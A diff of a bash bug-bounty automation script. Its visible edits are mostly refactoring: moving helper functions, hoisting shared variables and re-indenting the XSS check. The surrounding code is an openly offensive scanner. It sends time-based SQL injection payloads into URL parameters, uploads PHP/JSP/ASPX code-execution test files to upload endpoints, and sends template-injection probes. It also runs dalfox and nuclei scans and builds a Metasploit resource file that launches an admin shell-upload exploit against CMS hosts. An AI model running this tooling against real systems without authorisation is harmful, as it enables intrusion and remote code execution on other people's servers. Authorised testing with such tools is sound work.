@@ -24,6 +24,8 @@ MAGENTA='\033[0;35m'
 BOLD='\033[1m'
 NC='\033[0m'
 
+ts() { date '+%Y-%m-%d %H:%M:%S'; }
+
 log_ok()    { echo -e "${GREEN}[$(ts)] [+]${NC} $1"; }
 log_err()   { echo -e "${RED}[$(ts)] [-]${NC} $1"; }
 log_warn()  { echo -e "${YELLOW}[$(ts)] [!]${NC} $1"; }
@@ -32,7 +34,6 @@ log_step()  { echo -e "    ${CYAN}[$(ts)] [>]${NC} $1"; }
 log_done()  { echo -e "    ${GREEN}[$(ts)] [✓]${NC} $1"; }
 log_vuln()  { echo -e "    ${RED}${BOLD}[$(ts)] [VULN]${NC} $1"; }
 log_crit()  { echo -e "    ${MAGENTA}${BOLD}[$(ts)] [CRITICAL]${NC} $1"; }
-ts()        { date '+%Y-%m-%d %H:%M:%S'; }
 
 # ── Config ────────────────────────────────────────────────────────────────────
 RECON_DIR=""
@@ -76,8 +77,7 @@ if ! command -v timeout &>/dev/null; then
     fi
 fi
 
-mkdir -p "$FINDINGS_DIR"/{xss,sqli,takeover,misconfig,exposure,ssrf,cves,redirects,ssti,manual_review}
-
+# Determine findings directory
 if [ "$(basename "$(dirname "$RECON_DIR")")" = "sessions" ]; then
     SESSION_ID=$(basename "$RECON_DIR")
     TARGET=$(basename "$(dirname "$(dirname "$RECON_DIR")")")
@@ -87,7 +87,6 @@ else
     TARGET=$(basename "$RECON_DIR")
     DEFAULT_FINDINGS_DIR="$BASE_DIR/runtime/findings/$TARGET"
 fi
-
 FINDINGS_DIR="${FINDINGS_OUT_DIR:-$DEFAULT_FINDINGS_DIR}"
 
 export PATH="$HOME/go/bin:/usr/local/bin:/opt/homebrew/bin:$PATH"
@@ -149,7 +148,7 @@ PY
 verify_sqli_poc() {
     local url="$1"; local p_idx="$2"; local dialect="$3"
     log_step "  [VERIFY] Linear scaling check on param #$p_idx ($dialect)..."
-    
+
     # 1. Baseline (0s)
     T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "${BB_AUTH_ARGS[@]}" "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
 
@@ -162,7 +161,7 @@ verify_sqli_poc() {
     local pl2="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && pl2="'||pg_sleep(2)--%20"
     U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
     T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 "${BB_AUTH_ARGS[@]}" "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
-    
+
     D1=$(( T1 - T0 )); D2=$(( T2 - T1 ))
     # Allow 200ms jitter
     if [ "$D1" -gt 800 ] && [ "$D2" -gt 800 ]; then
@@ -174,17 +173,17 @@ verify_sqli_poc() {
 
 verify_upload_poc() {
     local upload_url="$1"; local base_url=$(echo "$upload_url" | cut -d'/' -f1-3); local ts=$(date +%s)
-    
+
     # Tech Detection
     local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
     local headers=$(curl -sk -I --max-time 5 "${BB_AUTH_ARGS[@]}" "$upload_url" || true)
     if echo "$headers" | grep -qi "jsp\|java\|tomcat"; then ext="jsp"; payload='<% out.print("RCE-VAL-" + (7*7)); %>'; fi
     if echo "$headers" | grep -qi "asp\|aspx\|\.net"; then ext="aspx"; payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'; fi
-    
+
     local canary="proof_${ts}.${ext}"
     echo "$payload" > "/tmp/$canary"
     log_step "  [VERIFY] Attempting RCE-Execution PoC (${ext}): $upload_url..."
-    
+
     for param in "file" "upload" "FileData" "userfile" "image"; do
         # Try upload
         curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 "${BB_AUTH_ARGS[@]}" "$upload_url" > /dev/null || true
@@ -215,6 +214,9 @@ done
 # Clean and uniqify
 awk '!seen[$0]++' "$ORDERED_SCAN" > "${ORDERED_SCAN}.tmp" && mv "${ORDERED_SCAN}.tmp" "$ORDERED_SCAN"
 [ ! -s "$ORDERED_SCAN" ] && log_err "No scan targets found" && exit 1
+
+LIVE_URLS="$RECON_DIR/live/urls.txt"
+PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
 
 # ── Check 0: Upload Surface Discovery ──────────────────────────────────
 if ! skip_has upload; then
@@ -252,7 +254,6 @@ if ! skip_has sqli; then
         nuclei -l "$ORDERED_SCAN" -tags sqli -severity medium,high,critical -silent "${BB_AUTH_ARGS[@]}" -o "$FINDINGS_DIR/sqli/nuclei_sqli.txt" || true
     fi
     # 2b. Manual Linear-Scaling Probes
-    PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
     if [ -s "$PARAMS_FILE" ]; then
         log_step "Advanced SQLi verification on top 10 parameterised URLs..."
         head -10 "$PARAMS_FILE" | while read -r url; do
@@ -288,24 +289,20 @@ fi
 # ── Check 3: XSS ────────────────────────────────────────────────────────
 if ! skip_has xss; then
     log_info "Check 3: XSS (dalfox + URL dedup + global timeout)"
-    PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
     if tool_ok dalfox && [ -s "$PARAMS_FILE" ]; then
-LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
-log_info "Scanning $LIVE_COUNT live hosts"
+        LIVE_COUNT=$(wc -l < "$LIVE_URLS" 2>/dev/null || echo 0)
+        log_info "Scanning $LIVE_COUNT live hosts"
 
-# ============================================================
-# Check 1: XSS (Cross-Site Scripting)
-# ============================================================
-log_info "Check 1: XSS Detection"
+        log_info "Check 1: XSS Detection"
 
-# Dalfox — automated XSS scanner (with global timeout + URL dedup)
-if command -v dalfox &>/dev/null && [ -s "$PARAM_URLS" ]; then
-    DAL_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 30 || echo 100)
-    DAL_MAX_TIME=$([ "$QUICK_MODE" = "--quick" ] && echo 300 || echo 900)
-    # Deduplicate by base-URL + sorted param keys to avoid scanning the same
-    # endpoint N times with different random values (e.g. ?rand=1.234 variants)
-    DAL_DEDUP_FILE=$(mktemp /tmp/dalfox_dedup_XXXXXX.txt)
-    python3 - "$PARAM_URLS" "$DAL_DEDUP_FILE" <<'PYEOF' 2>/dev/null || cp "$PARAM_URLS" "$DAL_DEDUP_FILE"
+        # Dalfox — automated XSS scanner (with global timeout + URL dedup)
+        if command -v dalfox &>/dev/null && [ -s "$PARAMS_FILE" ]; then
+            DAL_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 30 || echo 100)
+            DAL_MAX_TIME=$([ "$QUICK_MODE" = "--quick" ] && echo 300 || echo 900)
+            # Deduplicate by base-URL + sorted param keys to avoid scanning the same
+            # endpoint N times with different random values (e.g. ?rand=1.234 variants)
+            DAL_DEDUP_FILE=$(mktemp /tmp/dalfox_dedup_XXXXXX.txt)
+            python3 - "$PARAMS_FILE" "$DAL_DEDUP_FILE" <<'PYEOF' 2>/dev/null || cp "$PARAMS_FILE" "$DAL_DEDUP_FILE"
 import sys
 from urllib.parse import urlparse, parse_qs
 seen = set()
@@ -323,37 +320,36 @@ with open(sys.argv[1]) as fin, open(sys.argv[2], 'w') as fout:
             seen.add(key)
             fout.write(url + '\n')
 PYEOF
-    ORIG_COUNT=$(wc -l < "$PARAM_URLS" 2>/dev/null || echo 0)
-    DEDUP_COUNT=$(wc -l < "$DAL_DEDUP_FILE" 2>/dev/null || echo 0)
-    log_step "Running dalfox on $DAL_LIMIT URLs (deduped $ORIG_COUNT → $DEDUP_COUNT, timeout: ${DAL_MAX_TIME}s)..."
-    head -"$DAL_LIMIT" "$DAL_DEDUP_FILE" | \
-        timeout "$DAL_MAX_TIME" dalfox pipe \
-        --silence \
-        --no-color \
-        --worker 5 \
-        --delay 100 \
-        --timeout 10 \
-        "${BB_AUTH_ARGS[@]}" \
-        --output "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || true
-    rm -f "$DAL_DEDUP_FILE"
+            ORIG_COUNT=$(wc -l < "$PARAMS_FILE" 2>/dev/null || echo 0)
+            DEDUP_COUNT=$(wc -l < "$DAL_DEDUP_FILE" 2>/dev/null || echo 0)
+            log_step "Running dalfox on $DAL_LIMIT URLs (deduped $ORIG_COUNT → $DEDUP_COUNT, timeout: ${DAL_MAX_TIME}s)..."
+            head -"$DAL_LIMIT" "$DAL_DEDUP_FILE" | \
+                timeout "$DAL_MAX_TIME" dalfox pipe \
+                --silence \
+                --no-color \
+                --worker 5 \
+                --delay 100 \
+                --timeout 10 \
+                "${BB_AUTH_ARGS[@]}" \
+                --output "$FINDINGS_DIR/xss/dalfox_results.txt" 2>/dev/null || true
+            rm -f "$DAL_DEDUP_FILE"
 
-    DALFOX_COUNT=$(count_findings "$FINDINGS_DIR/xss/dalfox_results.txt")
-    [ "$DALFOX_COUNT" -gt 0 ] && log_vuln "Dalfox found $DALFOX_COUNT potential XSS" || log_done "Dalfox: no XSS found"
+            DALFOX_COUNT=$(count_vuln "$FINDINGS_DIR/xss/dalfox_results.txt")
+            [ "$DALFOX_COUNT" -gt 0 ] && log_vuln "Dalfox found $DALFOX_COUNT potential XSS" || log_done "Dalfox: no XSS found"
+        fi
     fi
-fi
 fi
 
 # ── Check 4: SSTI ───────────────────────────────────────────────────────
 if ! skip_has ssti; then
     log_info "Check 4: SSTI (reflected parameter probes)"
-    PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
     SSTI_OUT="$FINDINGS_DIR/ssti/ssti_candidates.txt"
     if [ -s "$PARAMS_FILE" ]; then
         # Removed associative array for Bash 3.2 compatibility
         # engines: jinja2, freemarker, thymeleaf, erb
         SSTI_ENGINES=("jinja2" "freemarker" "thymeleaf" "erb")
         SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "*{7*7}" "<%= 7*7 %>")
-        
+
         SSTI_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 20 || echo 50)
         log_step "Testing SSTI payloads on up to $SSTI_LIMIT URLs..."
         hit=0
@@ -391,7 +387,7 @@ if ! skip_has cms; then
             HOST_PART=$(echo "$url" | cut -d'/' -f3 | cut -d':' -f1)
             RHOST_VAL=$(dig +short "$HOST_PART" | head -1)
             [ -z "$RHOST_VAL" ] && RHOST_VAL="$HOST_PART"
-            
+
             echo "use exploit/unix/webapp/${CMS}_admin_shell_upload" > "$MSF_RC"
             echo "set RHOSTS $RHOST_VAL" >> "$MSF_RC"
             echo "set SSL $([[ "$url" == https* ]] && echo "true" || echo "false")" >> "$MSF_RC"
